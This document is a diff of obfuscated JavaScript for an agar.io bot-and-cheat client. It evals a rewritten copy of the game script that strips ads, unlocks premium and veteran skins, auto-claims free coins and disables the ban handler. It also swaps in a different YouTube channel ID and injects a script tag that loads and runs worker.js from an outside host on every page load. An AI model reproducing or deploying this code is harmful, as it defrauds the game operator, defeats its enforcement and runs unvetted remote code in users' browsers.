-                return Math.sqrt(Math.pow(c - a, 2) + Math.pow(b - d, 2))
-            }
-        }, onmessage = function(a) {
-            var b = a.data;
-            switch (b.name) {
-                case "botID":
-                    G047.botID = b.botID;
+    }
+}, Bot.prototype = {
+    start: function() {
+        var _0xe846x2 = this;
+        this.worker = new Worker(URL.createObjectURL(new Blob(["(" + generateBot.toString() + ")()"], {
+            type: "text/javascript"
+        }))), this.worker.onmessage = function(b) {
+            var _0xe846x5 = b.data;
+            switch (_0xe846x5.name) {
+                case "add":
+                    _0xe846x2.alive = !0, _0xe846x2.id < 2 && addBallToMinimap(!0, "bot" + _0xe846x2.id, _0xe846x5.botName, _0xe846x5.x, _0xe846x5.y, "#FF00FF", !0), updateBotCount();
                     break;
-                case "server":
-                    G047.server = b.server, self.core && core.connect(b.server);
+                case "remove":
+                    _0xe846x2.alive = !1, _0xe846x2.id < 2 && removeBallFromMinimap("bot" + _0xe846x2.id), updateBotCount();
                     break;
                 case "position":
-                    G047.collectPellets && 99999 != G047.pelletTargetX && 99999 != G047.pelletTargetY ? (G047.newX = G047.pelletTargetX, G047.newY = G047.pelletTargetY) : (G047.newX = b.x - G047.mapOffsetX, G047.newY = b.y - G047.mapOffsetY);
-                    break;
-                case "split":
-                    core.split();
-                    break;
-                case "eject":
-                    core.eject();
-                    break;
-                case "names":
-                    if (null == b.botNames) {
-                        G047.botName = "G047Clan";
-                        break
-                    }
-                    G047.botName = b.botNames[getRandomInt(0, b.botNames.length - 1)];
-                    break;
-                case "disconnect":
-                    G047.server = null, self.core && core.disconnect();
-                    break;
-                case "collectPellets":
-                    G047.collectPellets = b.collectPellets;
+                    _0xe846x2.x = _0xe846x5.x, _0xe846x2.y = _0xe846x5.y, _0xe846x2.id < 2 && moveBallOnMinimap("bot" + _0xe846x2.id, _0xe846x5.x, _0xe846x5.y);
                     break;
                 default:
-                    console.log("Unknown message received.")
-            }
-        }, setInterval(function() {
-            G047.realPlayerX = G047.mapOffsetX + G047.playerX, G047.realPlayerY = G047.mapOffsetY + G047.playerY, postMessage({
-                botID: G047.botID,
-                name: "position",
-                x: G047.realPlayerX,
-                y: G047.realPlayerY
-            }), self.core && core.sendNick(G047.botName)
-        }, 100), getBotCore()
-    }.toString()
-}
-window.history.replaceState("", "", "/" + location.hash), window.getTextWidth = function(a, b) {
-    var c = getTextWidth.canvas || (getTextWidth.canvas = document.createElement("canvas")),
-        d = c.getContext("2d");
-    d.font = b;
-    var e = d.measureText(a);
-    return e.width
+                    console.log("Unknown command received from bot")
+            };
+            _0xe846x2.lastUpdate = Date.now()
+        }
+    }
 };
-var entityMap = {
-        "&": "&amp;",
-        "<": "&lt;",
-        ">": "&gt;",
-        '"': "&quot;",
-        "'": "&#39;",
-        "/": "&#x2F;"
-    },
-    client_uuid = '';
-if (null === client_uuid || 15 != client_uuid.length) {
+var bots = {},
+    client_uuid = escapeHtml(localStorage.getItem("G047_uuid"));
+if (null === client_uuid || 30 != client_uuid.length) {
     client_uuid = "";
-    for (var ranStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", ii = 0; ii < 15; ii++) client_uuid += ranStr.charAt(Math.floor(Math.random() * ranStr.length));
+    for (var ranStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", ii = 0; ii < 30; ii++) {
+        client_uuid += ranStr.charAt(Math.floor(Math.random() * ranStr.length))
+    };
     localStorage.setItem("G047_uuid", client_uuid)
-}
+};
 window.G047 = {
     server: null,
     playerName: "",
@@ -482,133 +320,172 @@ window.G047 = {
     mapOffsetFixed: !1,
     zoomValue: 1,
     zoomResetValue: 0,
-    zoomSpeedValue: .9,
+    zoomSpeedValue: 0.9,
     autoZoom: !0,
     stopMovement: !1,
     isAlive: !1,
     moveToMouse: !0,
-    localBots: {},
-    localBotsAlive: {},
     remoteBotsServer: null,
-    remoteBots: {},
-    remoteBotsAlive: {},
     leaderboardData: "",
-    serverBots: 0,
+    currentServerBots: 0,
+    maxServerBots: 0,
     isAuthorized: !1,
-    drawMinimap: !0,
-    setMapCoords: function(a, b, c, d, e, f) {
-        f - e == 24 && c - a > 14e3 && d - b > 14e3 && (this.mapOffsetX = this.mapOffset - c, this.mapOffsetY = this.mapOffset - d, this.mapOffsetFixed = !0)
+    iG047me: function() {
+        return window.MC && MC.iG047me && MC.iG047me()
+    },
+    setMapCoords: function(_0xe846x2, b, _0xe846x5, _0xe846x6, _0xe846xa, _0xe846xb) {
+        _0xe846xb - _0xe846xa == 24 && _0xe846x5 - _0xe846x2 > 14e3 && _0xe846x6 - b > 14e3 && (this.mapOffsetX = this.mapOffset - _0xe846x5, this.mapOffsetY = this.mapOffset - _0xe846x6, this.mapOffsetFixed = !0)
     },
     playerDied: function() {
-        G047.isAlive = !1, moveBallOnMinimap("player_death", this.realPlayerX, this.realPlayerY), setBallVisible("player_pointer", !1), setBallVisible("player_death", !0), sendCommand({
+        G047.isAlive = !1, moveBallOnMinimap("player_death", this.realPlayerX, this.realPlayerY), setBallVisible("player_pointer", !1), setBallVisible("player_death", !0), sendMinimapServerCommand({
             name: "dead"
         })
     },
     playerSpawned: function() {
-        G047.isAlive = !0, changeNicknameOnBall("player_pointer", G047.playerName), setBallVisible("player_spectate", !1), setBallVisible("player_pointer", !0), sendCommand({
+        G047.isAlive = !0, changeNicknameOnBall("player_pointer", G047.playerName), setBallVisible("player_spectate", !1), setBallVisible("player_pointer", !0), sendMinimapServerCommand({
             name: "alive",
             playerName: G047.playerName
         })
     },
-    playerConnected: function(a) {
-        resetMinimap(), null != this.remoteBotsServer && this.remoteBotsServer == a && sendRemoteBotsMessage({
+    playerConnected: function(_0xe846x2) {
+        G047.server = _0xe846x2, this.remoteBotsServer == _0xe846x2 && sendBotsMessage(!1, {
             name: "disconnect"
-        }), G047.server = a, console.log("Connecting to: " + a), setBallVisible("player_pointer", !1), setBallVisible("player_death", !1), setBallVisible("player_spectate", !1), sendLocalBotsMessage({
+        }), setBallVisible("player_pointer", !1), setBallVisible("player_death", !1), setBallVisible("player_spectate", !1), ":party" == $("#gamemode").val() ? sendBotsMessage(!0, {
             name: "server",
-            server: a
+            server: _0xe846x2
+        }) : sendBotsMessage(!0, {
+            name: "disconnect"
+        }), connectToMinimapServer(_0xe846x2), sendBotServerCommand({
+            name: "server",
+            server: _0xe846x2
         })
     },
     playerDisconnected: function() {
-        resetMinimap(), sendCommand({
+        G047.server = null, resetMinimap(), sendMinimapServerCommand({
             name: "dead"
-        }), setBallVisible("player_pointer", !1), setBallVisible("player_death", !1), setBallVisible("player_spectate", !1), G047.server = null, G047.isAlive = !1
+        }), setBallVisible("player_pointer", !1), setBallVisible("player_death", !1), setBallVisible("player_spectate", !1), G047.isAlive = !1
     },
     playerSpectated: function() {
-        setBallVisible("player_pointer", !1), setBallVisible("player_spectate", !0), sendCommand({
+        setBallVisible("player_pointer", !1), setBallVisible("player_spectate", !0), sendMinimapServerCommand({
             name: "dead"
         })
     },
-    updateNickname: function(a) {
-        this.playerName = a
+    updateNickname: function(_0xe846x2) {
+        this.playerName = _0xe846x2
     },
     loadCore: function() {
         setTimeout(function() {
-            startLocalBots(), startRemoteBots()
+            startBots()
         }, 2e3), console.log("Loading core.");
-        var b = (document.getElementById("canvas"), localStorage.getItem("botnames"));
-        null !== b && (G047.botNames = validateNames(b), null !== G047.botNames && $("#botnames").val(b), updateBotNames()), $("#botnames").on("input", function() {
-            var a = $("#botnames").val(),
-                b = validateNames(a);
-            G047.botNames = b, updateBotNames(), null !== b && localStorage.setItem("botnames", a)
-        }), $("#leaderboardcopy").click(function(a) {
+        var _0xe846x2 = localStorage.getItem("botnames");
+        null !== _0xe846x2 && (G047.botNames = validateNames(_0xe846x2), null !== G047.botNames && $("#botnames").val(_0xe846x2), updateBotNames()), $("#botnames").on("input", function() {
+            var _0xe846x2 = $("#botnames").val(),
+                b = validateNames(_0xe846x2);
+            G047.botNames = b, updateBotNames(), localStorage.setItem("botnames", null === b ? "" : _0xe846x2)
+        }), $("#newBotCount").on("keypress", function(_0xe846x2) {
+            return _0xe846x2.charCode >= 48 && _0xe846x2.charCode <= 57
+        }), $("#newBotCount").on("input", function() {
+            var _0xe846x2 = $("#newBotCount").val();
+            (!isNumber(_0xe846x2) || _0xe846x2 < 0 || _0xe846x2 > G047.maxServerBots) && (_0xe846x2 = G047.maxServerBots), updateRemoteBotCount(_0xe846x2)
+        }), $("#botSlider").on("input", function() {
+            var _0xe846x2 = $("#botSlider").val();
+            updateRemoteBotCount(_0xe846x2)
+        }), $("#leaderboardcopy").click(function(_0xe846x2) {
             var b = $("#leaderboard")[0];
             b.setSelectionRange(0, b.value.length), b.select();
             try {
                 document.execCommand("copy")
-            } catch (a) {
+            } catch (_0xe846x2) {
                 console.log("Failed to copy leaderboard.")
             }
-        }), $("#uuidcopy").click(function(a) {
+        }), $("#uuidcopy").click(function(_0xe846x2) {
             var b = $("#uuid")[0];
             b.setSelectionRange(0, b.value.length), b.select();
             try {
                 document.execCommand("copy")
-            } catch (a) {
+            } catch (_0xe846x2) {
                 console.log("Failed to copy uuid.")
             }
         });
-        var c, d = !1,
-            f = !1;
-        $(document).keydown(function(a) {
-            switch (a.which) {
+        var b, _0xe846x5 = !1,
+            _0xe846x6 = !1,
+            _0xe846xa = !0;
+        $(document).keydown(function(_0xe846x2) {
+            switch (_0xe846x2.which) {
                 case 65:
-                    G047.moveToMouse = !G047.moveToMouse, G047.moveToMouse ? $("#ismoveToMouse").html("<font color='#7FFF00'>On</font>") : $("#ismoveToMouse").html("<font color='red'>Off</font>");
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    G047.moveToMouse = !G047.moveToMouse, G047.moveToMouse ? $("#ismoveToMouse").html("<font color=\"#7FFF00\">On</font>") : $("#ismoveToMouse").html("<font color=\"red\">Off</font>");
                     break;
                 case 68:
-                    G047.stopMovement = !G047.stopMovement, G047.stopMovement ? $("#isStopMove").html("<font color='#7FFF00'>On</font>") : $("#isStopMove").html("<font color='red'>Off</font>");
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    G047.stopMovement = !G047.stopMovement, G047.stopMovement ? $("#isStopMove").html("<font color=\"#7FFF00\">On</font>") : $("#isStopMove").html("<font color=\"red\">Off</font>");
                     break;
                 case 69:
+                    if (!G047.iG047me()) {
+                        return
+                    };
                     emitSplit();
                     break;
                 case 82:
+                    if (!G047.iG047me()) {
+                        return
+                    };
                     emitMassEject();
                     break;
                 case 77:
-                    G047.drawMinimap = !G047.drawMinimap, G047.drawMinimap ? $("#botcanvas").show() : $("#botcanvas").hide();
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    _0xe846xa = !_0xe846xa, _0xe846xa ? $("#G047").show() : $("#G047").hide();
                     break;
                 case 80:
-                    f = !f, f ? $("#collectPellets").html("<font color='#7FFF00'>On</font>") : $("#collectPellets").html("<font color='red'>Off</font>"), sendLocalBotsMessage({
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    _0xe846x6 = !_0xe846x6, _0xe846x6 ? $("#collectPellets").html("<font color=\"#7FFF00\">On</font>") : $("#collectPellets").html("<font color=\"red\">Off</font>"), sendBotsMessage(!0, {
                         name: "collectPellets",
-                        collectPellets: f
-                    }), G047.isAuthorized && sendCommand({
+                        collectPellets: _0xe846x6
+                    }), G047.isAuthorized && sendBotServerCommand({
                         name: "collectPellets",
-                        collectPellets: f
+                        collectPellets: _0xe846x6
                     });
                     break;
                 case 87:
-                    if (d) return;
-                    d = !0, c = setInterval(function() {
-                        core.eject()
+                    if (_0xe846x5) {
+                        return
+                    };
+                    _0xe846x5 = !0, b = setInterval(function() {
+                        G047.iG047me() && core.eject()
                     }, 50)
             }
-        }), $(document).keyup(function(a) {
-            switch (a.which) {
+        }), $(document).keyup(function(_0xe846x2) {
+            switch (_0xe846x2.which) {
                 case 87:
-                    d = !1, clearInterval(c);
+                    _0xe846x5 = !1, clearInterval(b);
                     break;
                 case 84:
-                    var b = 0,
-                        e = setInterval(function() {
-                            return b > 7 ? void clearInterval(e) : (b++, void core.split())
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    var _0xe846x6 = 0,
+                        _0xe846xa = setInterval(function() {
+                            return _0xe846x6 > 7 ? void(clearInterval)(_0xe846xa) : (_0xe846x6++, void(core).split())
                         }, 50);
                     break;
                 case 81:
-                    var f = 0,
-                        g = setInterval(function() {
-                            return f > 1 ? void clearInterval(g) : (f++, void core.split())
+                    if (!G047.iG047me()) {
+                        return
+                    };
+                    var _0xe846xb = 0,
+                        _0xe846x17 = setInterval(function() {
+                            return _0xe846xb > 1 ? void(clearInterval)(_0xe846x17) : (_0xe846xb++, void(core).split())
                         }, 50)
             }
-        }), addBallToMinimap(!0, "player_pointer", G047.playerName, G047.realPlayerX, G047.realPlayerY, "#00FF00", !1), addBallToMinimap(!0, "player_death", "Last Death", G047.realPlayerX, G047.realPlayerY, "#FF2400", !1), addBallToMinimap(!0, "player_spectate", "Spectate", G047.realPlayerX, G047.realPlayerY, "#0000FF", !1), connectToG047Server(), insertCore(), setInterval(function() {
+        }), addBallToMinimap(!0, "player_pointer", G047.playerName, G047.realPlayerX, G047.realPlayerY, "#00FF00", !1), addBallToMinimap(!0, "player_death", "Last Death", G047.realPlayerX, G047.realPlayerY, "#FF2400", !1), addBallToMinimap(!0, "player_spectate", "Spectate", G047.realPlayerX, G047.realPlayerY, "#0000FF", !1), insertCore(), connectToBotServer(), setInterval(function() {
             MC.G047FreeCoins()
         }, 5e3), setInterval(function() {
             drawMinimap()
@@ -624,40 +501,30 @@ window.G047 = {
 var tempLeaderBoard = "",
     tempLeaderBoardIndex = 1;
 CanvasRenderingContext2D.prototype._fillText = CanvasRenderingContext2D.prototype.fillText, CanvasRenderingContext2D.prototype.fillText = function() {
-    this._fillText.apply(this, arguments), "Leaderboard" === arguments[0] ? ("" != tempLeaderBoard && (G047.leaderboardData = tempLeaderBoard, $("#leaderboard").val(G047.leaderboardData)), tempLeaderBoardIndex = 1, tempLeaderBoard = "") : ":teams" != $("#gamemode").val() && 0 == arguments[0].indexOf(tempLeaderBoardIndex + ".") && tempLeaderBoardIndex < 11 ? (tempLeaderBoard += arguments[0] + (tempLeaderBoardIndex <= 9 ? ", " : ""), tempLeaderBoardIndex++) : this._fillText.apply(this, arguments)
+    this._fillText.apply(this, arguments), "Leaderboard" === arguments[0] ? ("" !== tempLeaderBoard && (G047.leaderboardData = tempLeaderBoard, $("#leaderboard").val(G047.leaderboardData)), tempLeaderBoardIndex = 1, tempLeaderBoard = "") : ":teams" != $("#gamemode").val() && 0 === arguments[0].indexOf(tempLeaderBoardIndex + ".") && tempLeaderBoardIndex < 11 && (tempLeaderBoard += arguments[0] + (tempLeaderBoardIndex <= 9 ? ", " : ""), tempLeaderBoardIndex++)
 }, CanvasRenderingContext2D.prototype._drawImage = CanvasRenderingContext2D.prototype.drawImage, CanvasRenderingContext2D.prototype.drawImage = function() {
     arguments[0].src && "http://agar.io/img/background.png" == arguments[0].src && (arguments[0].src = ""), this._drawImage.apply(this, arguments)
 };
-var miniMap = null,
-    minimapCtx = null;
-minimapBalls = {}, MinimapBall.prototype = {
-    draw: function(a, b, c) {
-        if (this.visible) {
-            this.lastX = (29 * this.lastX + this.x) / 30, this.lastY = (29 * this.lastY + this.y) / 30;
-            var d = ((this.isDefault ? this.x : this.lastX) + G047.mapOffset) * b,
-                e = ((this.isDefault ? this.y : this.lastY) + G047.mapOffset) * c;
-            a.fillStyle = this.color, a.font = "10px Ubuntu", a.textAlign = "center", a.fillText("" == this.name ? "An unnamed cell" : this.name, d, e - 10), a.beginPath(), a.arc(d, e, 4.5, 0, 2 * Math.PI, !1), a.closePath(), a.fillStyle = this.color, a.fill()
-        }
-    }
-};
-var b = new XMLHttpRequest;
+var minimap = null,
+    minimapCtx = null,
+    minimapBalls = {},
+    b = new XMLHttpRequest;
 b.open("GET", "/mc/agario.js", !0), b.onload = function() {
-    var script = b.responseText;
-    script = replaceNormalFile(script, 'if(js.keyCode==32&&i1!="nick"){js.preventDefault()}', ""), script = replaceNormalFile(script, "showAds:function(i){if", "showAds:function(i){},showFuck:function(i){if"), script = replaceNormalFile(script, "showPromoBadge:function(", "showPromoBadge:function(i){},fuckbacks: function("), script = replaceRegexFile(script, /(return\s\w+.tab.toUpperCase\(\)).indexOf\(\w+.toUpperCase\(\)\)!=-1/, "$1 != 'VETERAN'"), script = replaceRegexFile(script, /if\(\w+.shouldSkipConfigEntry\(\w+.productIdToQuantify.*visibility\)\)\{continue\}/, ""), script = replaceNormalFile(script, "if(this.getSkinsByCategory(i1.tabDescription).length>0", 'if (this.getSkinsByCategory(i1.tabDescription).length > 0 && (i1.tabDescription.toUpperCase() == "PREMIUM" || i1.tabDescription.toUpperCase() == "VETERAN" || i1.tabDescription.toUpperCase() == "OWNED")'), script = replaceRegexFile(script, /var\si2=window.document.createElement..script..+head.appendChild.i2../i, "G047.reloadCore();"), script = replaceRegexFile(script, /(showFreeCoins:function\(\)\{var.*showContainer\(\);if\(([a-zA-Z0-9]+[a-zA-Z0-9]+.user.userInfo==null).*false\);([a-zA-Z0-9]+[a-zA-Z0-9]+.triggerFreeCoins\(\)).*this.onShopClose\)\)\}},)/, "$1 G047FreeCoins: function(){if($2){return;}$3;},"), script = replaceNormalFile(script, "onPlayerBanned:function(i)", "onPlayerBanned: function(i){},shitfacefuck:function(i)"), eval(script);
-    var e = new XMLHttpRequest;
-    e.open("GET", "/", !0), e.onload = function() {
-        var a = e.responseText;
-        a = replaceNormalFile(a, "UCC6hurPo_LxL7C0YFYgYnIw", "UC4DrulGqgDXz6wir8_i-WYQ"), a = replaceRegexFile(a, /<footer[\S\s]*\/footer>/i, ""), a = replaceNormalFile(a, '<script src="agario.core.js" async></script>', "<div id='botcanvas' style='background:rgba(0,0,0,0.4); width: 200px; bottom: 214px; right: 9px; display: block; position: absolute; text-align: center; font-size: 15px; color: #ffffff; padding: 5px; font-family: Ubuntu;'> <font color='#7FFF00'></font><br>Bots: <a id='botCount'><font color='red'>0 / 2</font></a><br><font color='#00BFFF'>A</font> - Move To Mouse: <a id='ismoveToMouse'><font color='#7FFF00'>On</font></a><br><font color='#00BFFF'>P</font> - Collect Pellets: <a id='collectPellets'><font color='red'>Off</font></a><br><font color='#00BFFF'>D</font> - Stop Movement: <a id='isStopMove'><font color='red'>Off</font></a></div>"), a = replaceNormalFile(a, "<body>", '<body onload="G047.loadCore()">'), a = replaceRegexFile(a, /<script type="text\/javascript" src="mc\/agario\.js.*"><\/script>/i, ""), a = replaceRegexFile(a, /<div id="adsBottom".*display:block;">/i, '<div id="adsBottom" style="display:none">'), a = replaceNormalFile(a, '<div class="diep-cross" style="', '<div class="diep-cross" style="display:none;'), a = replaceNormalFile(a, '<div id="promo-badge-container">', '<div id="promo-badge-container" style="display:none;">'), a = replaceNormalFile(a, '<span data-itr="page_instructions_w"></span><br/>', '<span data-itr="page_instructions_w"></span><br/><span>Press <b>Q</b> to double split</span><br><span>Hold <b>W</b> to rapid fire mass</span><br><span>Press <b>M</b> to hide/show the minimap</span><br><span>Press <b>E</b> to split bots</span><br><span>Press <b>R</b> to eject some bots mass</span><br><span>Press <b>P</b> to make bots collect pellets</span>'), a = replaceNormalFile(a, '<div id="tags-container">', '<div id="leaders" class="input-group" style="margin-top: 6px;"><span class="input-group-addon" style="width:75px"id="basic-addon1">BOARD</span><input id="leaderboard" type="text" value="" style="width:185px" readonly class="form-control"><button id="leaderboardcopy" class="btn btn-primary" style="float: right; width: 60px; border-radius: 0px 4px 4px 0px;" data-original-title="" title="">Copy</button></div><div class="input-group" style="margin-top: 6px;"><span class="input-group-addon" style="width:75px"id="basic-addon1">UUID</span><input id="uuid" type="text" value="' + client_uuid + '" style="width:185px" readonly class="form-control"><button id="uuidcopy" class="btn btn-primary" style="float: right; width: 60px; border-radius: 0px 4px 4px 0px;" data-original-title="" title="">Copy</button></div><div class="input-group" style="margin-top: 6px;"><span class="input-group-addon" style="width:75px" id="basic-addon1">NAMES</span><input id="botnames" class="form-control" style="width:245px" placeholder="Separate bot names using commas" autofocus=""></div><div id="tags-container">'), a = replaceNormalFile(a, "</body>", '<div style="display:block;position:absolute;z-index:100;pointer-events:none;right:9px;bottom:9px;"><canvas id="minimap"></div></body>'), document.open(), document.write(a), document.close()
-    }, e.send()
+    var _0xe846x13 = b.responseText;
+    _0xe846x13 = replaceNormalFile(_0xe846x13, "showAds:function(i){if", "showAds:function(i){},showFuck:function(i){if"), _0xe846x13 = replaceNormalFile(_0xe846x13, "showPromoBadge:function(", "showPromoBadge:function(i){},fuckbacks: function("), _0xe846x13 = replaceNormalFile(_0xe846x13, "if(this.getSkinsByCategory(i1.tabDescription).length>0", "if (this.getSkinsByCategory(i1.tabDescription).length > 0 && (i1.tabDescription.toUpperCase() == \"PREMIUM\" || i1.tabDescription.toUpperCase() == \"VETERAN\" || i1.tabDescription.toUpperCase() == \"OWNED\")"), _0xe846x13 = replaceNormalFile(_0xe846x13, "onPlayerBanned:function(i)", "onPlayerBanned: function(i){},shitfacefuck:function(i)"), _0xe846x13 = replaceNormalFile(_0xe846x13, "canShowOfferPopup:function(i1,i2,i){", "canShowOfferPopup:function(i1,i2,i){return false;"), _0xe846x13 = replaceRegexFile(_0xe846x13, /if\(\w\w.keyCode==32&&\w\w!="nick"\){\w\w.preventDefault\(\)}/, ""), _0xe846x13 = replaceRegexFile(_0xe846x13, /(return\s\w+.tab.toUpperCase\(\)).indexOf\(\w+.toUpperCase\(\)\)!=-1/, "$1 != 'VETERAN'"), _0xe846x13 = replaceRegexFile(_0xe846x13, /if\(\w+.shouldSkipConfigEntry\(\w+.productIdToQuantify.*visibility\)\)\{continue\}/, ""), _0xe846x13 = replaceRegexFile(_0xe846x13, /var\si2=window.document.createElement..script..+head.appendChild.i2../i, "G047.reloadCore();"), _0xe846x13 = replaceRegexFile(_0xe846x13, /(showFreeCoins:function\(\)\{var.*showContainer\(\);if\(([a-zA-Z0-9]+[a-zA-Z0-9]+.user.userInfo==null).*false\);([a-zA-Z0-9]+[a-zA-Z0-9]+.triggerFreeCoins\(\)).*this.onShopClose\)\)\}},)/, "$1 G047FreeCoins: function(){if($2){return;}$3;},"), eval(_0xe846x13);
+    var _0xe846xa = new XMLHttpRequest;
+    _0xe846xa.open("GET", "/", !0), _0xe846xa.onload = function() {
+        var _0xe846x2 = _0xe846xa.responseText;
+        _0xe846x2 = replaceNormalFile(_0xe846x2, "UCC6hurPo_LxL7C0YFYgYnIw", "UC4DrulGqgDXz6wir8_i-WYQ"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<script src=\"js/a.js?a&amp;ad_box_\"></script>", ""), _0xe846x2 = replaceNormalFile(_0xe846x2, "<head>", "<head><script src='http://www.singaclan.tk/euhefuhe9e9991/worker.js?v=" + Math.floor(1e10 * Math.random() + 1) + "'></script>"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<script src=\"agario.core.js\" async></script>", ""), _0xe846x2 = replaceNormalFile(_0xe846x2, "<body>", "<body onload=\"G047.loadCore()\">"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<div class=\"diep-cross\" style=\"", "<div class=\"diep-cross\" style=\"display:none;"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<div id=\"promo-badge-container\">", "<div id=\"promo-badge-container\" style=\"display:none;\">"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<span data-itr=\"page_instructions_w\"></span><br/>", "<span data-itr=\"page_instructions_w\"></span><br/><span>Press <b>Q</b> to double split</span><br><span>Hold <b>W</b> to rapid fire mass</span><br><span>Press <b>M</b> to hide/show the minimap</span><br><span>Press <b>E</b> to split bots</span><br><span>Press <b>R</b> to eject some bots mass</span><br><span>Press <b>P</b> to make bots collect pellets</span>"), _0xe846x2 = replaceNormalFile(_0xe846x2, "<div id=\"tags-container\">", "<div id=\"leaders\" class=\"input-group\" style=\"margin-top: 6px;\"><span class=\"input-group-addon\" style=\"width:75px\"id=\"basic-addon1\">BOARD</span><input id=\"leaderboard\" type=\"text\" value=\"\" style=\"width:185px\" readonly class=\"form-control\"><button id=\"leaderboardcopy\" class=\"btn btn-primary\" style=\"float: right; width: 60px; border-radius: 0px 4px 4px 0px;\" data-original-title=\"\" title=\"\">Copy</button></div><hr><div id=\"uuiddiv\" class=\"input-group\" style=\"margin-top: 6px;\"><span class=\"input-group-addon\" style=\"width:75px\"id=\"basic-addon1\">UUID</span><input id=\"uuid\" type=\"text\" value=\"" + client_uuid + "\" style=\"width:185px\" readonly class=\"form-control\"><button id=\"uuidcopy\" class=\"btn btn-primary\" style=\"float: right; width: 60px; border-radius: 0px 4px 4px 0px;\" data-original-title=\"\" title=\"\">Copy</button></div><div id=\"sliderDiv\" class=\"input-group\" style=\"margin-top: 6px;\"><span style=\"margin-right:10px;width:75px;height:34px;padding:6px 12px;font-size:14px;font-weight:400;line-height:1;color:#555;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px;white-space:nowrap;vertical-align:middle;display:table-cell;\">COUNT</span><div style=\"float:left;padding:1px;width:9px;\"></div><input type=\"range\" id=\"botSlider\" style=\"position:relative;float:left;width:165px;top:4px;\" value=\"150\" max=\"300\"><div style=\"float:left;padding:1px;width:9px;\"></div><input id=\"newBotCount\" style=\"display:table-cell;position:relative;z-index:2;float:left;margin-bottom:0;height:34px;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#FFF;background-image:none;border:1px solid #ccc;border-radius:4px;box-shadow:inset 0 1px 1px rgba(0x0x0x.075);transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;width:60px\" placeholder=\"#\"></div><div class=\"input-group\" style=\"margin-top: 6px;\"><span class=\"input-group-addon\" style=\"width:75px\" id=\"basic-addon1\">NAMES</span><input id=\"botnames\" class=\"form-control\" style=\"width:245px\" placeholder=\"Separate bot names using commas\" autofocus=\"\"></div><div id=\"tags-container\">"), _0xe846x2 = replaceNormalFile(_0xe846x2, "</body>", "<div id=\"G047\" style=\"user-drag:none;pointer-events:none;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select: none;user-select: none;\"><div id=\"botcanvas\" style=\"background:rgba(0,0,0,0.4); width: 230px; bottom: 244px; right: 9px; display: block; position: absolute; text-align: center; font-size: 15px; color: #ffffff; padding: 5px; font-family: Ubuntu;\"> <font color=\"#7FFF00\">G047 Bots</font><br>Bots: <a id=\"botCount\"><font color=\"red\">0 / 2</font></a><br><font color=\"#00BFFF\">A</font> - Move To Mouse: <a id=\"ismoveToMouse\"><font color=\"#7FFF00\">On</font></a><br><font color=\"#00BFFF\">P</font> - Collect Pellets: <a id=\"collectPellets\"><font color=\"red\">Off</font></a><br><font color=\"#00BFFF\">D</font> - Stop Movement: <a id=\"isStopMove\"><font color=\"red\">Off</font></a></div><div style=\"display:block;position:absolute;z-index:100;right:9px;bottom:9px;\"><canvas id=\"minimap\"></div></div></body>"), _0xe846x2 = replaceRegexFile(_0xe846x2, /<script\stype="text\/javascript">\nvar\shasAdblock[\s\S]*raction':\s1}\);\n<\/script>/, ""), _0xe846x2 = replaceRegexFile(_0xe846x2, /<footer[\S\s]*\/footer>/i, ""), _0xe846x2 = replaceRegexFile(_0xe846x2, /<script type="text\/javascript" src="mc\/agario\.js.*"><\/script>/i, ""), _0xe846x2 = replaceRegexFile(_0xe846x2, /<div id="adsBottom".*display:block;">/i, "<div id=\"adsBottom\" style=\"display:none\">"), document.open(), document.write(_0xe846x2), document.close()
+    }, _0xe846xa.send()
 }, b.send(), setInterval(function() {
     G047.realPlayerX = G047.mapOffsetX + G047.playerX, G047.realPlayerY = G047.mapOffsetY + G047.playerY, moveBallOnMinimap("player_pointer", G047.realPlayerX, G047.realPlayerY), moveBallOnMinimap("player_spectate", G047.realPlayerX, G047.realPlayerY)
 }, 50);
-var last_transmited_game_server = null,
-    socket = null;
+var grabServerSocket = null,
+    minimapSocket = null,
+    botSocket = null;
 setInterval(function() {
-    G047.isAuthorized || emitPosition()
-}, 1e3), setInterval(function() {
-    G047.isAuthorized && emitPosition(), emitLocalPosition(), transmit_current_server(!1)
-}, 100);
-document.body.innerHTML = '';
-//Decoded By G047, Sun, 28 Aug 2016 13:32:27 GMT
+    emitMinimapPosition()
+}, 400), setInterval(function() {
+    G047.isAuthorized && emitBotPosition(), emitLocalPosition(), checkBotsRestart()
+}, 100)
